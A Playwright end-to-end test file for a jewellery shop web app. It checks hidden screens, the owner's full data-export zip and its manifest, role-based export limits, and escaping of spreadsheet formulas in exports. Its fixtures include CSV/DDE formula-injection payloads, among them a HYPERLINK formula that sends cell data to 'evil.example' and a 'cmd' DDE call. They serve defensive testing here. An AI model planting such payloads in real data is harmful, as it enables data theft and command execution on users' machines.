import { execFile, spawn } from 'node:child_process';
import { randomUUID } from 'node:crypto';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { promisify } from 'node:util';
import { expect, test, type Download, type Page } from '@playwright/test';
import { htmlCells, parseCsv } from '../unit/support/csv';
import { readZipText } from '../unit/support/zip';
import { clearLoginCounters } from './clear-counters';
import { e2eLane, e2eLogin, type E2eLogin } from './global-setup';
import { roomInTheMinute } from './pacing';

// WEB12b (T-E04; clauses of T-R05 and T-D03; spec C15, B3, O32, O53, RV1-9): the hidden screens, and the owner's Download everything, in a real browser against the real API of a lane.
//
//   T-E04   the hidden screens cannot be reached by URL (Order Book, the public catalogue and its admin screen: for the owner, a biller, a staff user and a visitor with no session); the design
//           page has no Sales or Audit tab; the Reports screen has no date controls and no export buttons; the Estimate screen has no date editor and no edit mode; "Reset Defaults" and
//           "Delete All Inventory" are gone
//   T-E04   "Download everything" produces the zip: a fresh poll first (a customer written a moment before the press is in the file), the twelve files and MANIFEST.csv, whose counts equal the
//           database's; a cell that starts with = is written as text; the record route accepts the counts, the card and the line reset (one audit row); counts that do not match are refused
//           and the card keeps the old date
//   T-R05   the zip holds the files of B3 and a manifest that equals the database's counts; the owner-only weight is in it for the owner; and the DRILL: the Mac tool of the API
//           (scripts/zip-balances.mjs) rebuilds every customer's balance from the zip alone and agrees with customer_balances
//   T-D03   no CSV or Excel export of a biller holds the original weight; a biller sees no card and the record route refuses her
//   RV1-9   the inventory screen's CSV and Excel (open to all three roles) quote a formula cell
//
// The rows are written as root in the lane's container (the screens that make bills and pieces are proved in billing.spec.ts and add-design.spec.ts); the payments, the cancel and the refund go
// through the API's own routes by the owner's session, so every row is one the API made. Everything the tests made is taken out again, also `last_download`: the volume case of hydrate.spec.ts
// refuses a lane that holds a bill, a receipt or a counter that moved with no bill behind it. Rows are made relative to the clock, never at a fixed hour.
//
// Run: E2E=1 LANE=b JV_API_DIR=<checkout of jewelvault-api> npx playwright test tests/e2e/hidden-and-download.spec.ts

const execFileAsync = promisify(execFile);

// ------------------------------------------------------------------------------------------------ the lane's database (the container of this lane only)

function laneContainer(): string {
  const lane = process.env.LANE ?? '';
  const namespace = process.env.JV_LANE_NAMESPACE;
  return namespace ? `jv-mariadb-${namespace}-${lane}` : `jv-mariadb-${lane}`;
}

/** SQL as root in the lane's container. The password never leaves the container: the shell inside it reads it from its own environment. */
async function laneSql(sql: string): Promise<string[][]> {
  const { stdout } = await execFileAsync(
    'docker',
    [
      'exec',
      laneContainer(),
      'sh',
      '-c',
      'exec mariadb -uroot -p"$MARIADB_ROOT_PASSWORD" jv_lane -N -B -e "$1"',
      'sh',
      sql,
    ],
    { encoding: 'utf8', maxBuffer: 16 * 1024 * 1024 }
  );
  return stdout
    .split('\n')
    .filter((line) => line !== '')
    .map((line) => line.split('\t'));
}

/** The settings for the Mac tool of the API to read the lane's database: the published port and the root password, which go to the child's environment and nowhere else. */
async function laneDbEnvironment(): Promise<Record<string, string>> {
  const container = laneContainer();
  const port = (
    await execFileAsync('docker', ['port', container, '3306/tcp'], { encoding: 'utf8' })
  ).stdout.match(/:(\d+)\s*$/m)?.[1];
  if (!port) throw new Error(`the container ${container} publishes no database port`);
  const password = (
    await execFileAsync('docker', ['exec', container, 'printenv', 'MARIADB_ROOT_PASSWORD'], {
      encoding: 'utf8',
    })
  ).stdout.trim();
  return {
    DB_HOST: '127.0.0.1',
    DB_PORT: port,
    DB_NAME: 'jv_lane',
    DB_USER: 'root',
    DB_PASSWORD: password,
  };
}

const sqlText = (text: string) => `'${text.replace(/'/g, "''")}'`;

// ------------------------------------------------------------------------------------------------ the book of the tests

const HOSTILE = {
  hyperlink: '=HYPERLINK("http://evil.example/?"&A1,"click")',
  plus: '+1+1',
  minus: '-2+3',
  at: '@SUM(A1)',
  dde: "=cmd|' /C calc'!A0",
};
const WEIGHTS = { s1: '7.123', s2: '8.001' }; // the owner's original weights: no other value of the books is one of these

const ids = {
  meera: randomUUID(),
  dev: randomUUID(),
  designGold: randomUUID(),
  pieceOne: randomUUID(),
  pieceTwo: randomUUID(),
  bills: { m1: randomUUID(), d1: randomUUID(), m2: randomUUID() },
};

function kolkataDate(): string {
  return new Date(Date.now() + 19_800_000).toISOString().slice(0, 10);
}

function fixtureSql(): string {
  const today = kolkataDate();
  const bill = (
    id: string,
    number: string,
    customerId: string,
    total: string,
    minutesAgo: number
  ) =>
    `INSERT INTO bills (id, bill_no, customer_id, bill_date, sale_type, subtotal, discount, grand_total, notes, created_at) VALUES ` +
    `('${id}', '${number}', '${customerId}', '${today}', 'Retail', ${total}, 0.00, ${total}, ${sqlText(HOSTILE.minus)}, UTC_TIMESTAMP(6) - INTERVAL ${minutesAgo} MINUTE);`;
  const line = (billId: string, total: string) =>
    `INSERT INTO bill_items (id, bill_id, line_no, sku_id, design_no, sku_no, category, material, purity, selling_method, gross_weight, customer_net_weight, quantity, ` +
    `metal_rate, labour_rate, labour_amount, piroi, other_charges, metal_amount, fine_weight_due, item_total, list_metal_rate, list_labour_rate) VALUES ` +
    `('${randomUUID()}', '${billId}', 1, '${ids.pieceOne}', 'W12B-D1', 'W12B-S1', 'Ring', 'Gold', '22K', 'By Weight', 10.000, 9.000, 1, ` +
    `1.00, 0.00, 0.00, 0.00, 0.00, ${total}, 0.000, ${total}, 1.00, NULL);`;
  return [
    // a phone number typed with its +91 and a note that is a formula; one customer's address starts with a tab, one note with a carriage return
    `INSERT INTO customers (id, name, mobile, customer_type, notes, address) VALUES ('${ids.meera}', 'W12B Meera', '+919000120001', 'Retail', ${sqlText(HOSTILE.hyperlink)}, CONCAT(CHAR(9), 'Johari Bazaar'));`,
    `INSERT INTO customers (id, name, mobile, customer_type, notes) VALUES ('${ids.dev}', 'W12B Dev', '9000120002', 'Retail', CONCAT(CHAR(13), ${sqlText(HOSTILE.plus)}));`,
    `INSERT INTO designs (id, design_no, name, category_id, material, purity, selling_method, notes) SELECT '${ids.designGold}', 'W12B-D1', 'W12B gold ring', id, 'Gold', '22K', 'By Weight', ${sqlText(HOSTILE.at)} FROM categories ORDER BY name LIMIT 1;`,
    `INSERT INTO skus (id, design_id, sku_no, barcode, gross_weight, customer_net_weight, status, notes) VALUES ('${ids.pieceOne}', '${ids.designGold}', 'W12B-S1', 'W12BB1', 12.000, 11.500, 'In Stock', ${sqlText(HOSTILE.dde)});`,
    `INSERT INTO skus (id, design_id, sku_no, barcode, gross_weight, customer_net_weight, status) VALUES ('${ids.pieceTwo}', '${ids.designGold}', 'W12B-S2', 'W12BB2', 13.000, 12.500, 'In Stock');`,
    `INSERT INTO sku_private (sku_id, original_net_weight) VALUES ('${ids.pieceOne}', ${WEIGHTS.s1}), ('${ids.pieceTwo}', ${WEIGHTS.s2});`,
    bill(ids.bills.m1, 'W12B-0001', ids.meera, '10000.00', 9),
    line(ids.bills.m1, '10000.00'),
    bill(ids.bills.d1, 'W12B-0002', ids.dev, '20000.00', 8),
    line(ids.bills.d1, '20000.00'),
    bill(ids.bills.m2, 'W12B-0003', ids.meera, '3000.00', 7),
    line(ids.bills.m2, '3000.00'),
    // what the money services do on every bill (D23): the customer gets a new `updated_at`, which is how the polls find the change
    `UPDATE customers SET updated_at = CURRENT_TIMESTAMP(6) WHERE name LIKE 'W12B %';`,
  ].join(' ');
}

/** Everything these tests made, gone again. The delete order follows the foreign keys. */
async function cleanLane() {
  await laneSql(
    `DELETE FROM receipt_allocations WHERE customer_id IN (SELECT id FROM customers WHERE name LIKE 'W12B %'); ` +
      `DELETE FROM receipts WHERE customer_id IN (SELECT id FROM customers WHERE name LIKE 'W12B %'); ` +
      `DELETE FROM bill_items WHERE bill_id IN (SELECT id FROM bills WHERE bill_no LIKE 'W12B-%'); ` +
      `DELETE FROM bills WHERE bill_no LIKE 'W12B-%' OR customer_id IN (SELECT id FROM customers WHERE name LIKE 'W12B %'); ` +
      `DELETE FROM customers WHERE name LIKE 'W12B %'; ` +
      `DELETE FROM sku_private WHERE sku_id IN (SELECT id FROM skus WHERE sku_no LIKE 'W12B-%'); ` +
      `DELETE FROM skus WHERE sku_no LIKE 'W12B-%'; DELETE FROM designs WHERE design_no LIKE 'W12B-%'; ` +
      `DELETE FROM settings WHERE setting_key IN ('last_download', 'last_pulled');`
  );
}

// ------------------------------------------------------------------------------------------------ the page

const aside = (page: Page) => page.locator('aside').first();

/** Opens a page of the site as a person (the login screen first, so the memory is the one of a fresh start). */
async function open(page: Page, who: E2eLogin, url = '/') {
  await page.goto(url);
  await expect(page.getByLabel('Email')).toBeVisible();
  await page.getByLabel('Email').fill(who.email);
  await page.getByLabel('Password').fill(who.password);
  await page.getByRole('button', { name: 'Sign in' }).click();
  await expect(aside(page)).toContainText(who.fullName, { timeout: 60_000 });
}

/** A call to the API by the signed-in person's own session (the cookie is HttpOnly: only the page can send it). The answer is the status and the body. */
async function apiCall(page: Page, route: string, body: unknown) {
  const { apiUrl } = e2eLane();
  return page.evaluate(
    async ({ url, payload, key }) => {
      const response = await fetch(url, {
        method: 'POST',
        credentials: 'include',
        headers: {
          'content-type': 'application/json',
          'x-jv-client': 'web',
          'idempotency-key': key,
        },
        body: JSON.stringify(payload),
      });
      return {
        status: response.status,
        body: (await response.json().catch(() => null)) as unknown,
      };
    },
    { url: `${apiUrl}${route}`, payload: body, key: randomUUID() }
  );
}

/** The day, made by the API's own functions through the owner's session: a cancel, payments (one of them more than its bill: an advance), a refund. */
async function makeTheDay(page: Page) {
  const ok = (answer: { status: number }, status = 201) => expect(answer.status).toBe(status);
  ok(await apiCall(page, `/v1/bills/${ids.bills.m2}/cancel`, { reason: 'wrong customer' }), 200);
  ok(
    await apiCall(page, `/v1/customers/${ids.meera}/payments`, {
      amount: '4000.00',
      mode: 'Cash',
      bill_id: ids.bills.m1,
    })
  );
  ok(await apiCall(page, `/v1/customers/${ids.dev}/payments`, { amount: '25000.00', mode: 'UPI' }));
  ok(await apiCall(page, `/v1/customers/${ids.dev}/refunds`, { amount: '200.00', mode: 'Cash' }));
}

const scratch: string[] = [];
function scratchDir(): string {
  const dir = mkdtempSync(path.join(tmpdir(), 'jv-web12b-'));
  scratch.push(dir);
  return dir;
}
test.afterAll(() => {
  for (const dir of scratch) rmSync(dir, { recursive: true, force: true });
});

/** Presses a button that saves a file and returns the file. */
async function pressAndSave(
  page: Page,
  press: () => Promise<void>,
  dir: string
): Promise<{ download: Download; file: string; bytes: Buffer }> {
  const [download] = await Promise.all([
    page.waitForEvent('download', { timeout: 90_000 }),
    press(),
  ]);
  const file = path.join(dir, download.suggestedFilename());
  await download.saveAs(file);
  return { download, file, bytes: readFileSync(file) };
}

// The API lets one person make 300 calls a minute (A13) and makes a login wait after five in 15 minutes; every test of this file signs in, so each waits for room in the minute and
// starts from clean login counters (tests/e2e/pacing.ts, clear-counters.ts).
test.beforeEach(async ({ page }) => {
  await clearLoginCounters();
  await roomInTheMinute(page);
});
test.beforeEach(async () => {
  await cleanLane();
  await laneSql(fixtureSql());
});
test.afterEach(async () => {
  await cleanLane();
});
test.afterAll(async () => {
  // the lane is as it was found: none of this file's rows, and neither of the two reminders of the settings
  const [left] = await laneSql(
    `SELECT (SELECT COUNT(*) FROM customers WHERE name LIKE 'W12B %'), (SELECT COUNT(*) FROM bills WHERE bill_no LIKE 'W12B-%'), ` +
      `(SELECT COUNT(*) FROM receipts), (SELECT COUNT(*) FROM skus WHERE sku_no LIKE 'W12B-%'), (SELECT COUNT(*) FROM sku_private), ` +
      `(SELECT COUNT(*) FROM settings WHERE setting_key IN ('last_download', 'last_pulled'))`
  );
  expect(left).toEqual(['0', '0', '0', '0', '0', '0']);
});

const TABLES = [
  'customers',
  'bills',
  'bill_items',
  'receipts',
  'receipt_allocations',
  'designs',
  'skus',
  'daily_rates',
  'categories',
  'subcategories',
  'settings',
  'users',
] as const;

/**
 * The database's own count of every table of the zip. `last_download` is not counted: the record the press writes is a row of `settings`, and the zip was made before it.
 */
async function databaseCounts(): Promise<Record<string, number>> {
  const [row] = await laneSql(
    `SELECT ${TABLES.map((t) => `(SELECT COUNT(*) FROM ${t}${t === 'settings' ? " WHERE setting_key <> 'last_download'" : ''})`).join(', ')}`
  );
  return Object.fromEntries(TABLES.map((t, i) => [t, Number(row[i])]));
}

const auditRowsOfLastDownload = async () =>
  Number(
    (
      await laneSql(
        `SELECT COUNT(*) FROM audit_log WHERE table_name = 'settings' AND row_id = 'last_download'`
      )
    )[0][0]
  );

// ------------------------------------------------------------------------------------------------ T-E04: the hidden screens

test.describe('T-E04 E2E: the hidden screens cannot be reached', () => {
  test.describe.configure({ timeout: 300_000 });

  const HIDDEN = ['/order-book', '/catalogue', '/customer-catalogue'];

  test('a visitor with no session gets the login screen at every hidden URL, never the screen', async ({
    page,
  }) => {
    for (const url of HIDDEN) {
      await page.goto(url);
      await expect(page.getByLabel('Email')).toBeVisible();
      await expect(page.getByRole('heading', { name: /order book|catalogue/i })).toHaveCount(0);
    }
  });

  for (const role of ['owner', 'biller', 'staff'] as const) {
    test(`${role}: every hidden URL says "Not available for your role", the menus never offer them, and no screen of theirs is drawn`, async ({
      page,
    }) => {
      await open(page, e2eLogin(role), HIDDEN[0]);
      for (const url of HIDDEN) {
        await page.goto(url);
        await expect(page.getByText('Not available for your role')).toBeVisible({
          timeout: 60_000,
        });
        await expect(page.getByRole('heading', { name: /order book|catalogue/i })).toHaveCount(0);
        // nothing of the screens themselves: not the search box of the catalogue, not the order form
        await expect(page.getByRole('main').getByPlaceholder(/search/i)).toHaveCount(0);
        await expect(page.getByRole('main')).not.toContainText(/Receive Order|Catalogue/);
      }
      // the menus of the page (the side bar and the bottom bar): no link to a hidden screen, and no label for one
      const hrefs = await page
        .locator('a[href]')
        .evaluateAll((links) => links.map((a) => a.getAttribute('href') ?? ''));
      expect(
        hrefs.filter((h) =>
          HIDDEN.some(
            (route) => h === route || h.startsWith(`${route}/`) || h.startsWith(`${route}?`)
          )
        )
      ).toEqual([]);
      await expect(aside(page)).not.toContainText(/Order Book|Customer Catalogue/);
    });
  }

  test('the design page has its pieces and no Sales History or Audit Log tab', async ({ page }) => {
    await open(page, e2eLogin('owner'), `/design-detail?id=${ids.designGold}`);
    await expect(page.getByText('SKUs & Stock')).toBeVisible({ timeout: 60_000 });
    await expect(page.getByText('W12B-S1').first()).toBeVisible();
    await expect(page.getByText(/Sales History|Audit Log|Audit Trail/)).toHaveCount(0);
    await expect(
      page.getByRole('main').getByRole('button', { name: /Sales History|Audit/ })
    ).toHaveCount(0);
  });

  test('the Reports screen has its four tabs, no date control and no Excel, CSV or PDF button, on every tab', async ({
    page,
  }) => {
    await open(page, e2eLogin('owner'), '/reports');
    const main = page.getByRole('main');
    await expect(main.getByRole('heading', { name: 'Reports' })).toBeVisible({ timeout: 60_000 });
    for (const tab of ['Inventory', 'Sales', 'Payments', 'Jewellery Metrics']) {
      await main.getByRole('button', { name: tab, exact: true }).click();
      await expect(main.locator('input[type="date"]')).toHaveCount(0);
      await expect(main.getByRole('button', { name: /^(Excel|CSV|PDF)$/ })).toHaveCount(0);
      await expect(main).not.toContainText(/data exports/i);
    }
  });

  test('the Estimate screen, on the list and on a bill, has no date field and no Edit button', async ({
    page,
  }) => {
    await open(page, e2eLogin('owner'), '/estimate');
    const main = page.getByRole('main');
    await expect(main.getByText('W12B-0001').first()).toBeVisible({ timeout: 60_000 });
    await expect(main.locator('input[type="date"]')).toHaveCount(0);
    await page.goto(`/estimate?id=${ids.bills.m1}`);
    await expect(page.getByText('Grand Total').first()).toBeVisible({ timeout: 60_000 });
    await expect(main.locator('input[type="date"]')).toHaveCount(0);
    await expect(main.getByRole('button', { name: /^Edit/ })).toHaveCount(0);
    await expect(main.getByRole('link', { name: /^Edit/ })).toHaveCount(0);
  });

  test('"Reset Defaults" and "Delete All Inventory" are gone from Settings and from the inventory', async ({
    page,
  }) => {
    await open(page, e2eLogin('owner'), '/settings');
    await expect(page.getByRole('heading', { name: 'Settings' })).toBeVisible({ timeout: 60_000 });
    await expect(page.getByRole('button', { name: 'Reset Defaults' })).toHaveCount(0);
    await page.goto('/inventory-management');
    // the toolbar that used to hold the button is there (the seeded design is shown), and the button is not
    await expect(page.getByText(/\d+ designs/).first()).toBeVisible({ timeout: 60_000 });
    await expect(page.getByRole('button', { name: /Delete All Inventory/i })).toHaveCount(0);
  });
});

// ------------------------------------------------------------------------------------------------ T-E04 / T-R05 / T-D03: Download everything

test.describe('T-E04 E2E: Download everything', () => {
  test.describe.configure({ timeout: 300_000 });

  test('the owner presses it: a fresh poll, the twelve files and a manifest that equals the database, a formula as text, the record accepted, the card and the line reset, the Mac tool agrees', async ({
    page,
  }) => {
    await open(page, e2eLogin('owner'));
    await makeTheDay(page);
    await page.goto('/');
    const card = page.getByTestId('download-card');
    await expect(card).toBeVisible({ timeout: 60_000 });
    await expect(page.getByTestId('download-card-last')).toContainText('Not done yet');
    const auditBefore = await auditRowsOfLastDownload();

    // a customer written a moment ago: the 8-second poll has not brought her yet, the fresh poll of the press must
    await laneSql(
      `INSERT INTO customers (id, name, mobile, customer_type, notes) VALUES ('${randomUUID()}', 'W12B Late', '9000120009', 'Retail', ${sqlText(HOSTILE.dde)});`
    );

    const dir = scratchDir();
    const { file, bytes } = await pressAndSave(
      page,
      () => page.getByTestId('download-button').click(),
      dir
    );
    expect(path.basename(file)).toBe(`download-everything-${kolkataDate()}.zip`);

    // THE FILES
    const files = readZipText(bytes);
    expect([...files.keys()]).toEqual([...TABLES.map((t) => `${t}.csv`), 'MANIFEST.csv']);
    const csv = (name: string) => parseCsv(files.get(name) ?? '');

    // THE MANIFEST: the counts of the files, the counts of the database
    const counts = await databaseCounts();
    const manifest = csv('MANIFEST.csv');
    expect(manifest.header).toEqual(['file', 'rows', 'date']);
    expect(
      Object.fromEntries(
        manifest.rows.map(([name, rows]) => [name.replace(/\.csv$/, ''), Number(rows)])
      )
    ).toEqual(counts);
    for (const [name, rows] of manifest.rows)
      expect(csv(name).rows.length, name).toBe(Number(rows));
    expect(manifest.rows.every((r) => r[2] === kolkataDate())).toBe(true);

    // THE FRESH POLL: the customer written just before the press is in the file
    const customers = csv('customers.csv');
    const name = customers.header.indexOf('name');
    const note = customers.header.indexOf('notes');
    const address = customers.header.indexOf('address');
    const mobile = customers.header.indexOf('mobile');
    expect(customers.rows.map((r) => r[name])).toContain('W12B Late');

    // THE FORMULA GUARD: a cell that starts with =, +, a tab or a carriage return is written as text
    const meera = customers.rows.find((r) => r[name] === 'W12B Meera')!;
    const dev = customers.rows.find((r) => r[name] === 'W12B Dev')!;
    expect(meera[note]).toBe(`'${HOSTILE.hyperlink}`);
    expect(meera[address]).toBe("'\tJohari Bazaar");
    expect(meera[mobile]).toBe("'+919000120001");
    expect(dev[note]).toBe(`'\r${HOSTILE.plus}`);
    const bills = csv('bills.csv');
    expect(
      bills.rows.filter((r) => r[bills.header.indexOf('notes')] === `'${HOSTILE.minus}`)
    ).toHaveLength(3);
    const designs = csv('designs.csv');
    expect(designs.rows.map((r) => r[designs.header.indexOf('notes')])).toContain(`'${HOSTILE.at}`);

    // THE HEADERS are database column names: every one is a column of its table (skus.csv has the owner-only weight besides), and the Mac tool's own are among them
    for (const table of TABLES) {
      const columns = (
        await laneSql(
          `SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '${table}'`
        )
      ).map((r) => r[0]);
      const header = csv(`${table}.csv`).header.filter(
        (h) => !(table === 'skus' && h === 'original_net_weight')
      );
      expect(
        header.filter((h) => !columns.includes(h)),
        `${table}.csv`
      ).toEqual([]);
    }

    // THE OWNER-ONLY WEIGHT is in skus.csv for the owner, piece by piece
    const skus = csv('skus.csv');
    const weight = skus.header.indexOf('original_net_weight');
    const sku = skus.header.indexOf('sku_no');
    expect(skus.rows.find((r) => r[sku] === 'W12B-S1')![weight]).toBe(WEIGHTS.s1);
    expect(skus.rows.find((r) => r[sku] === 'W12B-S2')![weight]).toBe(WEIGHTS.s2);

    // THE PEOPLE: names and roles, never an e-mail address or a hash
    const users = csv('users.csv');
    expect(users.header).toEqual(['id', 'full_name', 'role', 'active', 'updated_at']);
    expect(files.get('users.csv')).not.toMatch(/@|\$|hash|password/i);

    // THE RECORD: accepted, the card and the line count from today, exactly one audit row
    await expect(page.getByTestId('download-status')).toContainText('Saved as', {
      timeout: 60_000,
    });
    await expect(card).toHaveAttribute('data-tone', 'ok');
    await expect(page.getByTestId('download-card-last')).toContainText('Today', {
      timeout: 30_000,
    });
    await expect(page.getByTestId('health-download')).toContainText('Today', { timeout: 30_000 });
    const [stored] = await laneSql(
      `SELECT value FROM settings WHERE setting_key = 'last_download'`
    );
    const record = JSON.parse(stored[0]) as {
      at: string;
      by: string;
      counts: Record<string, number>;
    };
    expect(record.counts).toEqual(counts);
    expect(record.counts).toEqual(
      Object.fromEntries(manifest.rows.map(([n, rows]) => [n.replace(/\.csv$/, ''), Number(rows)]))
    );
    expect(await auditRowsOfLastDownload()).toBe(auditBefore + 1);

    // THE DRILL (T-R05): the Mac tool of the API rebuilds every customer's balance from this zip alone and compares it with customer_balances
    const apiDir = process.env.JV_API_DIR;
    if (!apiDir) throw new Error('JV_API_DIR is not set.');
    const environment = await laneDbEnvironment();
    const output = await new Promise<{ code: number | null; text: string }>((resolve, reject) => {
      const child = spawn(
        process.execPath,
        [path.join(apiDir, 'scripts', 'zip-balances.mjs'), '--zip', file],
        {
          cwd: dir,
          env: { PATH: process.env.PATH ?? '', ...environment } as unknown as NodeJS.ProcessEnv,
        }
      );
      let text = '';
      child.stdout.on('data', (d) => (text += d));
      child.stderr.on('data', (d) => (text += d));
      child.on('error', reject);
      child.on('close', (code) => resolve({ code, text }));
    });
    expect(output.text, 'the Mac tool').toContain(`all ${customers.rows.length} customers agree`);
    expect(output.text).toContain('MANIFEST.csv: every row count agrees with the files.');
    expect(output.code).toBe(0);
  });

  test('counts that do not match are refused: the file is saved, the card says it was not recorded and keeps its old date, nothing is stored', async ({
    page,
  }) => {
    await open(page, e2eLogin('owner'));
    await makeTheDay(page);
    await page.goto('/');
    await expect(page.getByTestId('download-card')).toBeVisible({ timeout: 60_000 });
    await expect(page.getByTestId('download-card-last')).toContainText('Not done yet');
    const auditBefore = await auditRowsOfLastDownload();

    // the screen's own count of customers is made 50 too high on its way to the API
    let sent: unknown = null;
    await page.route('**/v1/owner/download-record', async (route) => {
      const body = route.request().postDataJSON() as {
        date: string;
        counts: Record<string, number>;
      };
      sent = body;
      await route.continue({
        postData: JSON.stringify({
          ...body,
          counts: { ...body.counts, customers: body.counts.customers + 50 },
        }),
      });
    });
    const dir = scratchDir();
    const { bytes } = await pressAndSave(
      page,
      () => page.getByTestId('download-button').click(),
      dir
    );
    expect(readZipText(bytes).has('MANIFEST.csv')).toBe(true);

    await expect(page.getByTestId('download-error')).toContainText('saved to your computer', {
      timeout: 60_000,
    });
    await expect(page.getByTestId('download-error')).toContainText(
      /not recorded|could not be recorded/
    );
    expect(sent).not.toBeNull();
    // the API changed nothing, and the card keeps its old date
    expect(
      await laneSql(`SELECT COUNT(*) FROM settings WHERE setting_key = 'last_download'`)
    ).toEqual([['0']]);
    expect(await auditRowsOfLastDownload()).toBe(auditBefore);
    await expect(page.getByTestId('download-card-last')).toContainText('Not done yet');
    await expect(page.getByTestId('download-card')).not.toHaveAttribute('data-tone', 'ok');

    // and pressing it again, with nothing in the way, works
    await page.unroute('**/v1/owner/download-record');
    await page.getByTestId('download-dismiss').click();
    await pressAndSave(page, () => page.getByTestId('download-button').click(), dir);
    await expect(page.getByTestId('download-status')).toContainText('Saved as', {
      timeout: 60_000,
    });
    await expect(page.getByTestId('download-card-last')).toContainText('Today', {
      timeout: 30_000,
    });
    expect(
      await laneSql(`SELECT COUNT(*) FROM settings WHERE setting_key = 'last_download'`)
    ).toEqual([['1']]);
  });

  for (const role of ['biller', 'staff'] as const) {
    test(`${role}: no card on the dashboard, and the record route refuses her`, async ({
      page,
    }) => {
      await open(page, e2eLogin(role));
      await expect(page.getByRole('heading').first()).toBeVisible({ timeout: 60_000 });
      await expect(page.getByTestId('download-card')).toHaveCount(0);
      await expect(page.getByTestId('health-line')).toHaveCount(0);
      const counts = Object.fromEntries(TABLES.map((t) => [t, 0]));
      const answer = await apiCall(page, '/v1/owner/download-record', {
        date: kolkataDate(),
        counts,
      });
      expect(answer.status).toBe(403);
      expect(
        await laneSql(`SELECT COUNT(*) FROM settings WHERE setting_key = 'last_download'`)
      ).toEqual([['0']]);
    });
  }
});

// ------------------------------------------------------------------------------------------------ T-D03 / RV1-9: the inventory screen's exports

test.describe('T-D03 / RV1-9 E2E: the inventory exports of every role', () => {
  test.describe.configure({ timeout: 300_000 });

  const exportOf = async (page: Page, button: 'CSV' | 'Excel') => {
    await expect(page.getByText(/\d+ designs/).first()).toBeVisible({ timeout: 60_000 });
    const dir = scratchDir();
    const { bytes } = await pressAndSave(
      page,
      () => page.getByRole('button', { name: button, exact: true }).click(),
      dir
    );
    return bytes.toString('utf8').replace(/^﻿/, '');
  };

  test("a biller's CSV and Excel have no original weight and no column for it, and quote a formula cell", async ({
    page,
  }) => {
    await open(page, e2eLogin('biller'), '/inventory-management');
    const csvText = await exportOf(page, 'CSV');
    const csv = parseCsv(csvText);
    expect(csv.header.filter((h) => /original/i.test(h))).toEqual([]);
    expect(csvText).not.toContain(WEIGHTS.s1);
    expect(csvText).not.toContain(WEIGHTS.s2);
    const piece = csv.rows.find((r) => r[csv.header.indexOf('SKU')] === 'W12B-S1');
    expect(piece, 'the seeded piece is in the file').toBeTruthy();
    expect(piece![csv.header.indexOf('Notes')]).toBe(`'${HOSTILE.dde}`);
    // the customer's weight is there: it is on the tag
    expect(piece![csv.header.indexOf('Customer Net Weight (g)')]).toBe('11.5');

    const html = await exportOf(page, 'Excel');
    expect(html).not.toContain(WEIGHTS.s1);
    expect(html).not.toContain(WEIGHTS.s2);
    expect(html).not.toMatch(/Original Net Weight/);
    expect(htmlCells(html)).toContain(`'${HOSTILE.dde}`);
    expect(htmlCells(html)).not.toContain(HOSTILE.dde);
  });

  test("the owner's CSV has the column with the weight of the piece, and the same formula cell quoted", async ({
    page,
  }) => {
    await open(page, e2eLogin('owner'), '/inventory-management');
    const csv = parseCsv(await exportOf(page, 'CSV'));
    const piece = csv.rows.find((r) => r[csv.header.indexOf('SKU')] === 'W12B-S1')!;
    expect(Number(piece[csv.header.indexOf('Original Net Weight (g)')])).toBe(Number(WEIGHTS.s1));
    expect(piece[csv.header.indexOf('Notes')]).toBe(`'${HOSTILE.dde}`);
  });
});
